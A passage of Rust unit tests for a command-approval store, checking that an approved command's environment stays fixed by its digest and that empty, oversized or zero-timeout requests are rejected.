        let mut store = ApprovalStore::load(&path).unwrap();
        store
            .grant(&resolved, ApprovalProvenance::User, None)
            .unwrap();
        let approved = authorize(&path, &requested)
            .unwrap()
            .with_compiled_in_environment(vec![("INJECTED".into(), "1".into())]);
        assert!(
            approved.environment().is_empty(),
            "the approved environment is fixed by the digest"
        );
    }

    #[test]
    fn an_empty_or_unbounded_request_is_refused_before_any_filesystem_work() {
        let root = tempfile::tempdir().unwrap();
        let mut empty = request(root.path(), Path::new("prove.sh"));
        empty.program = "  ".into();
        assert!(matches!(resolve(&empty), Err(ApprovalError::Invalid(_))));

        let mut many = request(root.path(), Path::new("prove.sh"));
        many.args = vec!["x".to_owned(); MAX_ARGUMENTS + 1];
        assert!(matches!(resolve(&many), Err(ApprovalError::Invalid(_))));

        let mut instant = request(root.path(), Path::new("prove.sh"));
        instant.timeout_ms = 0;
        assert!(matches!(resolve(&instant), Err(ApprovalError::Invalid(_))));
    }
}
